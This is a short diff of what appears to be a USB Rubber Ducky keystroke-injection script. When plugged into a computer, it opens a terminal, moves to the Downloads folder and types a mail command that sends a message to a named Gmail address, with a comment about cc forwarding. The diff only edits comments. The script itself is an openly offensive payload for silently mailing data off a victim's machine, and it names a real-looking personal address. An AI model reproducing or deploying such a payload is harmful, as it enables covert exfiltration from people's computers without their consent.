@@ -7,7 +7,7 @@ CTRL ALT t
 REM Go to any folder you want
 STRING cd Downloads/
 ENTER
-REM TEST is subject here
+REM TEST is subject here and receiver is: "subhransuchoudhury00@gmail.com"
 STRING mail -s "TEST" subhransuchoudhury00@gmail.com
 ENTER
 REM cc: for forewarding mail
@@ -19,4 +19,5 @@ CONTROL d
 DELAY 7000
 STRING exit
 ENTER
+REM check if required another enter.
 ENTER
